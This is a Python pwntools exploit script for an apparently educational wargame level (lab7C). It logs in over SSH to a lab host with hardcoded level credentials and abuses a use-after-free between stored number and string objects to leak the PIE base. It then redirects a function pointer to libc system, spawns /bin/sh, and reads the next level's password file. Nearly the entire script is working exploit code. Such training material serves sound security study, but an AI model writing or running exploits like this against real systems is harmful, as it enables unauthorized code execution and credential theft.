from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab7C', password = 'lab07start')

r = s.process("/levels/lab07/lab7C")
context.log_level = 'debug'

def make_string(data):
        r.sendlineafter(b'Enter Choice: ', b'1')
        sleep(1)
        r.sendlineafter(b'Input string to store: ', data)
def make_number(number):
        r.sendlineafter(b'Enter Choice: ', b'2')
        sleep(1)
        r.sendlineafter(b'Input number to store: ', str(number).encode())
def free_string():
        r.sendlineafter(b'Enter Choice: ', b'3')
        sleep(1)
def free_number():
        r.sendlineafter(b'Enter Choice: ', b'4')
        sleep(1)
def print_string(idx):
        r.sendlineafter(b'Enter Choice: ', b'5')
        r.sendlineafter(b'String index to print: ', str(idx).encode())
        sleep(1)
def print_number(idx):
        r.sendlineafter(b'Enter Choice: ', b'6')
        r.sendlineafter(b'Number index to print: ', str(idx).encode())
        sleep(1)
def quit_program():
        r.sendlineafter(b'Enter Choice: ', b'7')

make_number(1901)
free_number()
make_string(b'/bin/sh') #after putting string, small_str pointer will be put right after the function print_num
print_number(1) #print the location of small_str

r.recvuntil(b'not 1337 enough: ')
piebase = int(r.recvline()[:-1].decode()) - 0xbc7
log.info(hex(piebase))
system = piebase + 0x37e63190 #offset to libc__system

free_string()
make_number(system) #overwrite the small_str to libc
print_string(1) # system("/bin/sh")
r.sendline(b'cat /home/lab7A/.pass')

r.interactive()

